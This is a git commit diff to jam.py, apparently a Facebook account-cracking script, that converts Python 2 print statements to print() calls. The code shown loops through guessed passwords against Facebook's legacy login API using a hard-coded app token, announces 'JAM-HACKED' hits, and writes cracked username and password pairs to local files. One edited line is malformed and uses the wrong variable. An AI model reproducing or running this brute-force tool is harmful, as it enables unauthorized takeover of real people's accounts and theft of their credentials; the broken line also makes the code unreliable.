dd61f6cfc544af1d1ad7b0b10f41e70f65f9c8ae
huntsman-team <83459532+huntsman-team@users.noreply.github.com>
2021-05-03 23:40:21 -0700

    Update jam.py

--- jam.py
+++ jam.py
@@ -246,14 +246,14 @@ def action():
 			data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
 			q = json.load(data)
 			if 'access_token' in q:
-				print '\033[1;92mJAM-HACKED-✙-' + k + c + user + '-✙-' + pass1																				
+				print ('\033[1;92mJAM-HACKED-✙-' + k + c + user + '-✙-' + pass1)																			
 				okb = open('save/successfull.txt', 'a')
 				okb.write(k+c+user+'|'+pass1+'\n')
 				okb.close()
 				oks.append(c+user+pass1)
 			else:
 				if 'www.facebook.com' in q['error_msg']:
-					print '\033[1;94mAFTER(3DAYS)🗝-✙-' + k + c + user + '-✙-' + pass1
+					print ('\033[1;94mAFTER(3DAYS)🗝-✙-' + k + c + user + '-✙-' + pass1)
 					cps = open('save/checkpoint.txt', 'a')
 					cps.write(k+c+user+'|'+pass1+'\n')
 					cps.close()
@@ -263,14 +263,14 @@ def action():
 					data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
 			                q = json.load(data)
 					if 'access_token' in q:
-		                        	print '\033[1;92mJAM-HACKED-✙-' + k + c + user + '-✙-' + pass2                            											
+		                        	print ('\033[1;92mJAM-HACKED-✙-' + k + c + user + '-✙-' + pass2)                           											
 						okb = open('save/successfull.txt', 'a')
 						okb.write(k+c+user+'|'+pass2+'\n')
 						okb.close()
 						oks.append(c+user+pass2)
 					else:	
 						if 'www.facebook.com' in q['error_msg']:
-							print '\033[1;94mAFTER(3DAYS)🗝-✙-' + k + c + user + '-✙-' + pass2
+							(print '\033[1;94mAFTER(3DAYS)🗝-✙-' + k + c + user + '-✙-' + pass)
 							cps = open('save/checkpoint.txt', 'a')
 							cps.write(k+c+user+'|'+pass2+'\n')
 							cps.close()
@@ -280,14 +280,14 @@ def action():
 							data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
 			                                q = json.load(data)
 							if 'access_' in q:
-								print '\033[1;92mJAM-HACKED-✙-' + k + c + user + '-✙-' + pass3
+								print ('\033[1;92mJAM-HACKED-✙-' + k + c + user + '-✙-' + pass3)
 								okb = open('save/successfull.txt', 'a')
 								okb.write(k+c+user+'|'+pass3+'\n')
 								okb.close()
 								oks.append(c+user+pass3)
 							else:	
 								if 'www.facebook.com' in q['error_msg']:
-									print '\033[1;94mAFTER(3DAYS)🗝-✙-' + k + c + user + '-✙-' + pass3
+									print ('\033[1;94mAFTER(3DAYS)🗝-✙-' + k + c + user + '-✙-' + pass3)
 									cps = open('save/checkpoint.txt', 'a')
 									cps.write(k+c+user+'|'+pass3+'\n')
 									cps.close()
